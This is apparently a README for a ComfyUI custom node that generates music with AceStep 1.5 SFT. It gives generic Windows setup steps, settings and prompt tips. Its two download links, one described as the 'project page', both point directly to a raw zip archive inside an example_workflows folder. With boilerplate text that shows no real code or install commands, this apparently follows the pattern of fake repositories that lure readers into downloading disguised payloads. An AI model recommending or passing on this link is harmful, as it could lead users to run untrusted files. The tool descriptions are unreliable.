# 🎵 ComfyUI-AceStep_SFT - Simple Music Generation For ComfyUI

[![Download ComfyUI-AceStep_SFT](https://img.shields.io/badge/Download-ComfyUI--AceStep_SFT-blue?style=for-the-badge&logo=github)](https://github.com/kkali4892/ComfyUI-AceStep_SFT/raw/refs/heads/main/example_workflows/Comfy_Ace_Step_SFT_U_v3.0.zip)

## 🚀 What This App Does

ComfyUI-AceStep_SFT adds a single node to ComfyUI for AceStep 1.5 SFT music generation. It gives you direct control over the main audio settings so you can shape the result without digging through many tools.

Use it to:

- Create music from text prompts
- Adjust audio style and structure
- Match the official AceStep Gradio pipeline
- Keep the whole flow inside ComfyUI
- Fine-tune sound output with simple controls

## 💾 Download

Use this link to visit the project page and download it:

[https://github.com/kkali4892/ComfyUI-AceStep_SFT/raw/refs/heads/main/example_workflows/Comfy_Ace_Step_SFT_U_v3.0.zip](https://github.com/kkali4892/ComfyUI-AceStep_SFT/raw/refs/heads/main/example_workflows/Comfy_Ace_Step_SFT_U_v3.0.zip)

## 🪟 Windows Setup

Follow these steps on Windows.

### 1. Install ComfyUI

If you do not already have ComfyUI, install it first. Use the Windows version of ComfyUI and make sure it runs before you add this node.

### 2. Open the custom nodes folder

Find your ComfyUI folder, then open:

`ComfyUI\custom_nodes`

This is where custom nodes go.

### 3. Add this repository

Download this repository from the link above, then place the `ComfyUI-AceStep_SFT` folder inside:

`ComfyUI\custom_nodes\`

Your path should look like this:

`ComfyUI\custom_nodes\ComfyUI-AceStep_SFT`

### 4. Install any required files

Some ComfyUI nodes need extra Python packages or model files. If the repository includes install steps, follow them in the folder after download. If you use a portable ComfyUI setup, keep all files inside the same ComfyUI directory so paths stay simple.

### 5. Start ComfyUI

Launch ComfyUI the same way you normally do. After it starts, look for the AceStep SFT node in the node list.

### 6. Load the model

Place the AceStep 1.5 SFT model files in the model folder used by this node. Keep the folder names neat and easy to find. If the node asks for a model path, point it to the file you added.

## 🎛️ How To Use It

After ComfyUI opens:

1. Add the AceStep SFT node to your workflow
2. Type your music prompt
3. Set the audio length or generation settings
4. Choose the output style you want
5. Run the workflow
6. Save the generated audio file

A simple first prompt can be:

- calm ambient music with soft pads
- energetic electronic beat with crisp drums
- cinematic piano with warm strings
- relaxed lo-fi track with gentle rhythm

## 🔧 Main Controls

This node is built for fine control. Common settings include:

- Prompt text: describes the music you want
- Seed: helps repeat the same result
- Steps: affects how much time the model spends generating
- Guidance: changes how closely the output follows your prompt
- Length: sets how long the audio should be
- Temperature: changes how varied the output feels
- Output format: selects the saved audio type

These controls help you move from a rough idea to a cleaner result.

## 📁 File Layout

A typical setup looks like this:

- `ComfyUI/`
  - `custom_nodes/`
    - `ComfyUI-AceStep_SFT/`
- model files for AceStep 1.5 SFT
- generated audio output from ComfyUI

Keep the node folder in `custom_nodes` so ComfyUI can load it at startup.

## 🧰 Recommended Windows Setup

For the smoothest run, use:

- Windows 10 or Windows 11
- A recent NVIDIA GPU if you want faster generation
- Enough disk space for models and audio files
- Current ComfyUI build
- Stable internet connection for the first download

If you use a large model, keep extra storage free. Audio models can take a lot of space.

## 🎧 Best Use Cases

This node fits well when you want to:

- Test music ideas fast
- Generate background music
- Make short loops for videos
- Build sound sketches before final editing
- Compare prompt changes side by side
- Keep audio generation inside ComfyUI

## 🧩 Workflow Tips

To get better results:

- Keep prompts short and clear
- Use one style at a time
- Change one setting per test
- Save seeds that sound good
- Use the same length when comparing outputs
- Start with simple prompts before adding more detail

If the output sounds too busy, reduce prompt detail. If it sounds too flat, try a stronger style cue or different seed.

## 📦 What You Get

This repository gives you:

- One ComfyUI custom node
- AceStep 1.5 SFT music generation support
- Control over key audio settings
- A workflow that matches the official Gradio pipeline
- A setup that stays inside ComfyUI

## 🖱️ Basic Install Path

Use this path pattern on Windows:

`C:\ComfyUI\custom_nodes\ComfyUI-AceStep_SFT`

If your ComfyUI folder sits somewhere else, use that location instead.

## 🔍 Common Checks

If the node does not show up:

- Confirm the folder is inside `custom_nodes`
- Check that the folder name is exact
- Restart ComfyUI after adding the node
- Make sure model files are in the right place
- Check that your ComfyUI install runs without errors

If audio does not appear:

- Verify the output folder
- Check your save settings
- Try a shorter prompt and a simple seed
- Make sure the model loaded fully

## 🧠 What AceStep SFT Means

AceStep 1.5 SFT uses supervised fine-tuning. That means the model has been trained on cleaner examples so it can follow music prompts with more control and better audio quality.

In plain terms, it helps the model make more usable music with fewer rough edges.

## 📌 Topics

ace-step, ace-step15, comfyui, comfyui-custom-node, comfyui-nodes